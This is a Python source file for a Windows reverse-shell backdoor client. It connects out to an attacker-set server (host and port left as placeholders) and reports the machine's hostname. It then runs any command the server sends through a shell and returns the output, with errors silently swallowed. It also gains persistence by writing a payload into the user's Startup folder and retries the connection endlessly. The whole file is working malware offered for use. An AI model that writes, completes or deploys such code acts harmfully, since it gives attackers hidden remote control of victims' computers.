import os
import socket
import subprocess
import time
import signal
import sys
import struct
import shutil

class Client(object):

    def __init__(self):
        self.serverHost = 'CHANGE_ME'
        self.serverPort = CHANGE_ME
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('')
        sys.exit(0)
        return

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print('')
            return
        return

    def socket_connect(self):
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print('')
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print('')
            raise
        return

    def print_output(self, output_str):
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        return

    def receive_commands(self):
        try:
            self.socket.recv(10)
        except Exception as e:
            print('')
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'': break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break
            elif data[:].decode("utf-8") == 'remove':
                user = os.getlogin()
                target = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/python.pyw"%user
                os.remove(target)
                exit()
                break
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    output_str = "Command execution unsuccessful: %s\n" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('')
        self.socket.close()
        return

#CHANGE_THIS
#Payload in payload.txt
#Payload as hex: "\x9f\x23\" in str 
str = "HERE"
payload = str.encode("")

def main():
    user = os.getlogin()
    target = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Python.pyw"%user
    f = open(target, 'wb')
    f.write(payload)
    f.close()
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            time.sleep(5)     
        else:
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print('')
    client.socket.close()
    return

if __name__ == '__main__':
    while True:
        main()
